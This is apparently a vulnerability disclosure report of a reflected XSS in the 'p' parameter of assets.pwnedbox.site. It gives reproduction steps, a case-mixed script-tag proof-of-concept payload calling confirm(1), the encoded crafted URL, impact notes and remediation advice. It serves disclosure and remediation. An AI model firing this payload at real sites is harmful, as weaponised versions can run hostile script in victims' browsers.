## Title
Reflected XSS - assets.pwnedbox.site

## Description
The `p` GET parameter on `assets.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using `confirm(1)` was supplied through this parameter to execute JavaScript in the browser.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://assets.pwnedbox.site/
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://assets.pwnedbox.site/?p=hakama%27%22%3C%3E%3CsCRipt%3Econfirm%281%29%3C%2FsCRipt%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript confirmation dialog displaying `1`.

5. Click OK or Cancel to dismiss the dialog.

## POC (Proof of Concept)

**Target URL:**  
https://assets.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `p`

**Payload:**
```html
hakama'"><><sCRipt>confirm(1)</sCRipt>
```

**Crafted Request URL:**
```text
https://assets.pwnedbox.site/?p=hakama%27%22%3C%3E%3CsCRipt%3Econfirm%281%29%3C%2FsCRipt%3E
```

**Observed Result:**

The JavaScript payload supplied through the `p` parameter executes in the browser and displays a confirmation dialog containing `1`, demonstrating Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/f069fda7-2b7e-4308-92d1-100d20062854" />

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/c45f417d-6302-4d1c-b151-738759c14eed" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be used for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to user-controlled input before rendering it in HTML.
- Validate and sanitize input received through the `p` parameter.
- Implement a restrictive Content Security Policy (CSP) as an additional security measure.
